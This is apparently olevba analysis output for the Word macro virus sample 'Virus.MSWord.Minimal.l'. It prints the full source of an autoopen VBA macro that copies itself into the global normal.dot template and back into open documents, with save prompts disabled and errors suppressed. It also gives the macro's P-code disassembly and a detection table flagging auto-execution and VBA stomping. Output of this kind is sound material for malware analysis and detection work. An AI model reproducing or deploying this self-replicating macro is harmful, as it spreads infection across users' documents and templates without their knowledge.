olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Minimal.l - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
Dim c$
Dim b_ As Object
Dim c_ As Object
a$ = "autoopen"
b$ = WordBasic.[FileName$]()
c$ = WordBasic.[DefaultDir$](2) + "\normal.dot"
Dim a_ As Object: Set a_ = WordBasic.DialogRecord.Organizer(False)
Set a_ = WordBasic.CurValues.Organizer
a_.Copy = 1
a_.Tab = 3
a_.Name = a$
a_.Source = b$
a_.Destination = c$
On Error Resume Next
WordBasic.Organizer a_
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
If WordBasic.CountMacros(1) = 0 Then
a_.Source = c$
a_.Destination = b$
WordBasic.Organizer a_
Set b_ = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.ScreenUpdating
Set c_ = WordBasic.DialogRecord.FileNew(False)
Set c_ = WordBasic.CurValues.FileNew
c_.NewTemplate = 1
WordBasic.FileNew c_
Set b_ = WordBasic.CurValues.FileSaveAs
WordBasic.FileClose
b_.Name = WordBasic.[FileName$]()
WordBasic.FileSaveAs b_
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Minimal.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoopen - 2422 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn a
' Line #3:
' 	Dim 
' 	VarDefn B
' Line #4:
' 	Dim 
' 	VarDefn c
' Line #5:
' 	Dim 
' 	VarDefn b_ (As Object)
' Line #6:
' 	Dim 
' 	VarDefn c_ (As Object)
' Line #7:
' 	LitStr 0x0008 "autoopen"
' 	St a$ 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St B$ 
' Line #9:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\normal.dot"
' 	Add 
' 	St c$ 
' Line #10:
' 	Dim 
' 	VarDefn a_ (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd Organizer 0x0001 
' 	Set a_ 
' Line #11:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd Organizer 
' 	Set a_ 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld a_ 
' 	MemSt Copy 
' Line #13:
' 	LitDI2 0x0003 
' 	Ld a_ 
' 	MemSt Text 
' Line #14:
' 	Ld a$ 
' 	Ld a_ 
' 	MemSt New 
' Line #15:
' 	Ld B$ 
' 	Ld a_ 
' 	MemSt Source 
' Line #16:
' 	Ld c$ 
' 	Ld a_ 
' 	MemSt Destination 
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	Ld a_ 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0001 
' Line #19:
' 	LitDI2 0x0000 
' 	ParamNamed GlobalDotPrompt 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsOptionsSave 0x0001 
' Line #20:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	Ld c$ 
' 	Ld a_ 
' 	MemSt Source 
' Line #22:
' 	Ld B$ 
' 	Ld a_ 
' 	MemSt Destination 
' Line #23:
' 	Ld a_ 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0001 
' Line #24:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set b_ 
' Line #25:
' 	Ld WordBasic 
' 	ArgsMemCall ScreenUpdating 0x0000 
' Line #26:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileNew 0x0001 
' 	Set c_ 
' Line #27:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd FileNew 
' 	Set c_ 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld c_ 
' 	MemSt NewTemplate 
' Line #29:
' 	Ld c_ 
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0001 
' Line #30:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd FileSaveAs 
' 	Set b_ 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Ld b_ 
' 	MemSt New 
' Line #33:
' 	Ld b_ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

